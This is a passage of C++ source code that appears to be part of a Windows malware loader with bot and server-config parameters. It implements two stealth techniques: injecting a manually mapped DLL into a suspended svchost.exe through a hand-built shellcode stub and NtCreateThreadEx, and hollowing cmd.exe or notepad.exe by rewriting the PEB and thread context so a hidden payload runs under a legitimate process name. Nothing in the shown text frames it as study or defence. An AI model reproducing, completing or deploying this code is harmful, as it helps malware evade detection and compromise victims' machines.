            if (rva >= sec->VirtualAddress && rva < sec->VirtualAddress + sec->SizeOfRawData) {
                return moduleBase + sec->PointerToRawData + (rva - sec->VirtualAddress);
            }
        }
        return nullptr;
    };

    auto& expDir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (!expDir.Size) {
        LLOG("[DBG] No export directory (Size=0)");
        return nullptr;
    }

    auto pExp = reinterpret_cast<PIMAGE_EXPORT_DIRECTORY>(
        rvaToPtr(expDir.VirtualAddress));
    if (!pExp) {
        LLOG("[ERROR] FindExportRun: cannot map export directory");
        return nullptr;
    }

    auto names    = reinterpret_cast<DWORD*> (rvaToPtr(pExp->AddressOfNames));
    auto ordinals = reinterpret_cast<WORD*>  (rvaToPtr(pExp->AddressOfNameOrdinals));
    auto funcs    = reinterpret_cast<DWORD*> (rvaToPtr(pExp->AddressOfFunctions));

    for (DWORD i = 0; i < pExp->NumberOfNames; ++i) {
        BYTE* namePtr = rvaToPtr(names[i]);
        if (namePtr && _stricmp(reinterpret_cast<char*>(namePtr), "Run") == 0) {
            WORD ord = ordinals[i];
            DWORD rva = funcs[ord];
            auto addr = reinterpret_cast<LPTHREAD_START_ROUTINE>(remoteBase + rva);
            LLOG("[DBG] Found export \"Run\" at %p", addr);
            return addr;
        }
    }

    LLOG("[DBG] Export \"Run\" not found");
    return nullptr;
}

DWORD RunModule(
    LPBYTE module, DWORD module_size,
    LPCWSTR bot_id, LPSTR server_config,
    LPBYTE salsa20key, LPVOID arg, DWORD arg_size,
    std::string& error_str, LPDWORD process_id)
{
    EnsureConsole();
  //  InitSyscalls();

    WCHAR stubPath[MAX_PATH];
    GetSystemDirectoryW(stubPath, MAX_PATH);
    wcscat_s(stubPath, L"\\svchost.exe");

    STARTUPINFOW si{ sizeof(si) };
    PROCESS_INFORMATION pi{};
    if (!CreateProcessW(stubPath, nullptr, nullptr, nullptr, FALSE,
                        CREATE_SUSPENDED, nullptr, nullptr, &si, &pi))
    {
        error_str = "CreateProcessW failed";
        return GetLastError();
    }
    *process_id = pi.dwProcessId;

    auto dosHdr = reinterpret_cast<PIMAGE_DOS_HEADER>(module);
    auto ntHdr  = reinterpret_cast<PIMAGE_NT_HEADERS>(module + dosHdr->e_lfanew);
    {
        std::string archErr;
        if (!CheckArchMatch(pi.hProcess, ntHdr, archErr)) {
            error_str = "RunModule:" + archErr;
            TerminateProcess(pi.hProcess, 0);
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
            return ERROR_BAD_ENVIRONMENT;
        }
    }

    RemoteHeap rh(pi.hProcess);
    LPTHREAD_START_ROUTINE runEP = nullptr;
    std::string mapErr;
    if (!ManualMapDllToProcessWithRun(
             pi.hProcess, rh,
             module, module_size,
             runEP, mapErr))
    {
        error_str = "ManualMapWithRun:" + mapErr;
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return ERROR_INVALID_DATA;
    }

    struct ARGS {
        LPCWSTR bot;
        LPCWSTR cfg;
        LPBYTE  key;
        LPVOID  reserved;
    } args{};

    SIZE_T cbBot = (wcslen(bot_id) + 1) * sizeof(WCHAR);
    args.bot = (LPCWSTR)rh.alloc(cbBot);
    NtWriteVM(pi.hProcess, (PVOID)args.bot, (PVOID)bot_id, cbBot, nullptr);
    int wlen = MultiByteToWideChar(CP_UTF8, 0, server_config, -1, nullptr, 0);
    std::vector<WCHAR> wbuf(wlen);
    MultiByteToWideChar(CP_UTF8, 0, server_config, -1, wbuf.data(), wlen);
    args.cfg = (LPCWSTR)rh.alloc(wlen * sizeof(WCHAR));
    NtWriteVM(pi.hProcess, (PVOID)args.cfg, wbuf.data(), wlen * sizeof(WCHAR), nullptr);
    args.key = (LPBYTE)rh.alloc(32);
    NtWriteVM(pi.hProcess, args.key, salsa20key, 32, nullptr);

    args.reserved = arg_size ? rh.alloc(arg_size) : nullptr;
    if (arg_size) {
        NtWriteVM(pi.hProcess, args.reserved, arg, arg_size, nullptr);
    }

    //    x64:
    //    mov rcx, args.bot
    //    mov rdx, args.cfg
    //    mov r8,  args.key
    //    mov r9,  args.reserved
    //    sub rsp, 0x28
    //    mov rax, runEP
    //    call rax
    //    add rsp, 0x28
    //    ret
    #ifdef _WIN64
    // x64-fastcall RCX, RDX, R8, R9
    unsigned char stub[] = {
        0x48,0xB9, /* mov rcx, imm64 */    0,0,0,0,0,0,0,0,
        0x48,0xBA, /* mov rdx, imm64 */    0,0,0,0,0,0,0,0,
        0x49,0xB8, /* mov r8,  imm64 */    0,0,0,0,0,0,0,0,
        0x49,0xB9, /* mov r9,  imm64 */    0,0,0,0,0,0,0,0,
        0x48,0x83,0xEC,0x28,             // sub rsp,0x28
        0x48,0xB8, /* mov rax, imm64 */   0,0,0,0,0,0,0,0,
        0xFF,0xD0,                        // call rax
        0x48,0x83,0xC4,0x28,             // add rsp,0x28
        0xC3                             // ret
    };
    auto patch64 = [&](size_t offset, UINT_PTR value) {
        memcpy(&stub[offset], &value, sizeof(UINT_PTR));
    };
    patch64( 2, (UINT_PTR)args.bot);
    patch64(12, (UINT_PTR)args.cfg);
    patch64(22, (UINT_PTR)args.key);
    patch64(32, (UINT_PTR)args.reserved);
    patch64(38, (UINT_PTR)runEP);
#else
    // x86 stdcall
    unsigned char stub[] = {
        0x68,                // push imm32
          0,0,0,0,
        0x68,                // push imm32
          0,0,0,0,
        0x68,                // push imm32
          0,0,0,0,
        0x68,                // push imm32
          0,0,0,0,
        0xB8,                // mov eax, imm32 entryPoint
          0,0,0,0,
        0xFF,0xD0,           // call eax
        0x83,0xC4,0x10,      // add esp, 16
        0xC3                 // ret
    };
    auto patch32 = [&](size_t offset, uint32_t value) {
        memcpy(&stub[offset], &value, sizeof(uint32_t));
    };
    // offsets 1,6,11,16 
    patch32( 1, (uint32_t)args.bot);
    patch32( 6, (uint32_t)args.cfg);
    patch32(11, (uint32_t)args.key);
    patch32(16, (uint32_t)args.reserved);
    patch32(21, (uint32_t)runEP);
#endif

    // stub
    PVOID remoteStub = rh.alloc(sizeof(stub));
    NtWriteVM(pi.hProcess, remoteStub, stub, sizeof(stub), nullptr);
    NtFlushIC(pi.hProcess, remoteStub, sizeof(stub));

    auto NtCrTE = GetNt<NTSTATUS(NTAPI*)(
        PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES,
        HANDLE, PVOID, PVOID, ULONG,
        SIZE_T, SIZE_T, SIZE_T, PVOID)>("NtCreateThreadEx");

    HANDLE hTh = nullptr;
    NTSTATUS st = NtCrTE(
        &hTh,
        THREAD_ALL_ACCESS,
        nullptr,
        pi.hProcess,
        remoteStub,
        nullptr,
        FALSE,
        0, 0, 0,
        nullptr);

    if (!NT_SUCCESS(st)) {
        error_str = "NtCreateThreadEx failed";
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return ERROR_INVALID_DATA;
    }

    CloseHandle(hTh);

    ResumeThread(pi.hThread);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    SecureZeroMemory(module, module_size);
    LLOG("[DBG] Local DLL image buffer zeroed");
    return 0;
}

#if defined(_WIN64)
  #define PEB_IMAGE_BASE_OFFSET 0x10
#else
  #define PEB_IMAGE_BASE_OFFSET 0x08
#endif

DWORD RunExe(
    LPBYTE      payload,
    DWORD       payload_size,
    LPCWSTR     cmdline,
    std::string& error_str
) {
    LLOG("[ENTER] RunExe(payload=%p, size=%u, cmdline=\"%ls\")",
         payload, payload_size, cmdline);
    EnsureConsole();

    auto dos = reinterpret_cast<PIMAGE_DOS_HEADER>(payload);
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) {
        error_str = "Invalid DOS header"; 
        return ERROR_BAD_FORMAT;
    }
    auto nt = reinterpret_cast<PIMAGE_NT_HEADERS>(payload + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) {
        error_str = "Invalid NT header"; 
        return ERROR_BAD_FORMAT;
    }

    WCHAR stub[MAX_PATH];
    if (!GetWindowsDirectoryW(stub, MAX_PATH)) {
        error_str = "GetWindowsDirectoryW failed";
        return GetLastError();
    }
    if (nt->OptionalHeader.Subsystem == IMAGE_SUBSYSTEM_WINDOWS_CUI) {
        wcscat_s(stub, L"\\System32\\cmd.exe");
    } else {
        wcscat_s(stub, L"\\notepad.exe");
    }

    STARTUPINFOW si{ sizeof(si) };
    PROCESS_INFORMATION pi{};
    if (!CreateProcessW(
            stub, nullptr, nullptr, nullptr,
            FALSE,
            CREATE_SUSPENDED,
            nullptr, nullptr,
            &si, &pi))
    {
        error_str = "CreateProcessW failed";
        return GetLastError();
    }

    RemoteHeap rh(pi.hProcess);
    BYTE*                  remoteBase = nullptr;
    LPTHREAD_START_ROUTINE entryPoint = nullptr;
    std::string            mapErr;
    if (!ManualMapToProcess(
            pi.hProcess, rh,
            payload, payload_size,
            remoteBase,
            entryPoint,
            mapErr))
    {
        error_str = "ManualMapToProcess: " + mapErr;
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return ERROR_INVALID_DATA;
    }

    UNICODE_STRING us;
    pRtlInitUnicodeString(&us, cmdline);
    LPWCH env = GetEnvironmentStringsW();
    PRTL_USER_PROCESS_PARAMETERS pp = nullptr;
    using PFN = NTSTATUS(NTAPI*)(
        PRTL_USER_PROCESS_PARAMETERS*,
        PCUNICODE_STRING, PCUNICODE_STRING, PCUNICODE_STRING,
        PCUNICODE_STRING, PVOID,
        PCUNICODE_STRING, PCUNICODE_STRING, PCUNICODE_STRING, PCUNICODE_STRING,
        ULONG);
    auto RtlCreate = (PFN)GetProcAddress(
        GetModuleHandleW(L"ntdll.dll"),
        "RtlCreateProcessParametersEx"
    );
    if (!NT_SUCCESS(RtlCreate(
            &pp,
            &us, nullptr, nullptr,
            &us,
            env,
            nullptr,nullptr,nullptr,nullptr,
            RTL_USER_PROC_PARAMS_NORMALIZED)))
    {
        error_str = "RtlCreateProcessParametersEx failed";
        TerminateProcess(pi.hProcess,0);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return ERROR_INVALID_DATA;
    }
    FreeEnvironmentStringsW(env);

    SIZE_T ppLen = reinterpret_cast<MY_RTL_USER_PROCESS_PARAMETERS*>(pp)->Length;
    PVOID remotePP = rh.alloc(ppLen);
    NtWriteVM(pi.hProcess, remotePP, pp, ppLen, nullptr);
    RtlDestroyProcessParameters(pp);

    PROCESS_BASIC_INFORMATION pbi{};
    pNtQueryInformationProcess(
        pi.hProcess,
        ProcessBasicInformation,
        &pbi, sizeof(pbi), nullptr);

    // – ProcessParameters
    PVOID pebParms = (BYTE*)pbi.PebBaseAddress + offsetof(PEB, ProcessParameters);
    NtWriteVM(pi.hProcess, pebParms, &remotePP, sizeof(remotePP), nullptr);

    // – ImageBaseAddress
    PVOID pebImgBase = (BYTE*)pbi.PebBaseAddress + PEB_IMAGE_BASE_OFFSET;
    NtWriteVM(pi.hProcess, pebImgBase, &remoteBase, sizeof(remoteBase), nullptr);
    LLOG("[DBG] PEB.ImageBaseAddress -> %p", remoteBase);

    CONTEXT ctx{};
    ctx.ContextFlags = CONTEXT_FULL | CONTEXT_CONTROL;
    if (!GetThreadContext(pi.hThread, &ctx)) {
        error_str = "GetThreadContext failed";
        TerminateProcess(pi.hProcess,0);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return ERROR_INVALID_DATA;
    }
  #if defined(_WIN64)
    ctx.Rip = (DWORD64)entryPoint;
  #else
    ctx.Eip = (DWORD)(ULONG_PTR)entryPoint;
  #endif
    if (!SetThreadContext(pi.hThread, &ctx)) {
        error_str = "SetThreadContext failed";
        TerminateProcess(pi.hProcess,0);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return ERROR_INVALID_DATA;
    }

    ResumeThread(pi.hThread);

    DWORD w = WaitForSingleObject(pi.hProcess, 3000);
    if (w == WAIT_OBJECT_0) {
        DWORD code = 0;
        GetExitCodeProcess(pi.hProcess, &code);
        LLOG("[ERROR] Proc exited immediately: 0x%08X", code);
    }

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    SecureZeroMemory(payload, payload_size);

    LLOG("[+] RunExe OK");
    return 0;
}
